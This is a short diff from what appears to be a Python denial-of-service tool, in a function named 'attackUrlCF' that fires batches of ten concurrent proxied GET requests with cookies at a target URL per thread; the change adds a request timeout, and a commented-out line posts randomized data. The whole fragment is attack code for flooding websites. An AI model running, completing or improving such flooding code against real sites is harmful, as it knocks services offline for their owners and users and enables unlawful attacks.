@@ -120,7 +120,7 @@ def attackUrlCF(baseUrl, threadNum):
 
 			requestsArr = []
 			for x in range(10):
-				requestsArr.append(grequests.get(url, headers=headers, cookies=cookiesStr, proxies=proxies))
+				requestsArr.append(grequests.get(url, headers=headers, cookies=cookiesStr, proxies=proxies, timeout=10))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			print(threadNum, baseUrl , res)
